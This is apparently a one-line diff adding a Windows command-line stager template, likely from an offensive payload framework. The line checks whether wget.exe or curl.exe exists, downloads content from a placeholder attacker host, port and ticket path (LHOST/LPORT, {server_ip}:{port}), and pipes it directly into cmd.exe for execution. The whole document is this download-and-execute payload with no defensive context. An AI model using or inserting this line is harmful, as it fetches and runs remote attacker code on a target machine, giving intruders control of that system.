@@ -1,0 +1,1 @@
+wget.exe --version & if errorlevel 1 (curl.exe --version & if errorlevel 1 (echo "Neither cURL nor Wget seem to be in PATH") else (curl -s http://*LHOST*:*LPORT*/*TICKET* | cmd.exe)) else (wget -q http://{server_ip}:{port}/{ticket} | cmd.exe)'
